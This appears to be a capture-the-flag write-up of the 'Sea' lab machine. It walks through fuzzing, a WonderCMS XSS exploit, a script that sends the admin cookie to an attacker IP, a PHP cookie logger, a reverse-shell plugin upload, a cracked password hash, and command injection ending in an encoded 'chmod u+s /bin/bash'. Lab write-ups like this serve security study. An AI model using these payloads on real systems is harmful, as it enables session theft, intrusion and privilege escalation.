as always starting with nmap

`sudo nmap -sC -sV -p- -oN sea 10.10.11.28`
![[Pasted image 20240813000337.png]]

nothing just web (Stupid one)

nothing interesting in the website so , let's move to fuzzing

`feroxbuster  --url http://10.129.115.194 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 500,403,404

![[Pasted image 20240813001042.png]]

so we are dealing with WondwerCMS

this CVE is interesting since we are on version 3.2.0 (check http://sea.htb/themes/bike/version)
https://github.com/prodigiousMind/CVE-2023-41425 

this script exploit  an xss to steal credential then use this creds to uplaod backdoored files

I will use the same plugins used in this exploit
```bash
wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
```

we need to  change the ==rev.php== file on the zip 

```php
$VERSION = "1.0";
$ip = 'UR OWN IP'; // CHANGE THIS
$port = 1337;
```


then I  will host a web serve 

```bash
php -S 0.0.0.0:80
```

![[Pasted image 20240813003150.png]]

```bash
python3 exploit.py http://sea.htb/loginURL 10.10.14.224 1337
```

we need to find out a way to  send the link to the admin , since the web app is using ==php== let's fuzz for the .php file

```bash
feroxbuster  --url http://10.129.115.194  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 500,403,400 -x php 

```
![[Pasted image 20240813003629.png]]

![[Pasted image 20240813023000.png]]

once we fill the form , with the malicious link in the website field

```url
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.224/script.js"></script><form+action="
```

in the ==script.js==
```javascript
new Image().src='http://IP/index.php?c='+document.cookie
```

in the ==index.php==
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```


we will get the admin cookie in our web server
![[Pasted image 20240813023404.png]]
changing the cookies , guarantee more privilege in the website , we can now upload plugin

we can install our malicious plugins now , by tampering with the request sent from this button
![[Pasted image 20240813023604.png]]

```HTTP
GET /?installModule=http://IP/main.zip&directoryName=violet&type=themes&token=a5d00073e50332dd0ca6d448d4ccddc9449c7ae27828bb35cee8112d67debd58 HTTP/1.1
```

by visiting http://sea.htb/themes/revshell-main/rev.php

we should get shell on our listener 
![[Pasted image 20240813024341.png]]

this file got my intention
`/var/www/sea/data/database.js`
if we check his content we will find a hash
```
"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
```

we need to remove the escapers to crack it
```
"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q",
```

```bash
hashcat -a 0 -m 3200 --show hash                                       
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
```

this password got us  the  user ==amay==

another website is running on the port 8080 
```
amay@sea:~$ netstat -ntlp 
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name

```

but we need some type of authorization to access it

```bash
amay@sea:~$ curl 127.0.0.1:8080
Unauthorized access
```

I will reuse the password of amay
![[Pasted image 20240813025058.png]]

I will forward  the port 8080 to my machine , so I can see what's going on in this website

```
ssh -L 7000:localhost:8080 amay@sea.htb -N
```
 on http://127.0.0.1:7000/
 ![[Pasted image 20240813025643.png]]

I tried to read files , like ==/root/root.txt== but that didn't work 
![[Pasted image 20240813025715.png]]
so I tried to inject malicious command 

to confirm that , I will ping myself
first listen on the pings
``
```bash
sudo tcpdump -i  tun0 icmp
```

```HTTP
log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;ping+-c+1+10.10.14.224&analyze_log=
```

this works
![[Pasted image 20240813030024.png]]

I will run
```
chmod u+s /bin/bash
```

```http
log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68&analyze_log=
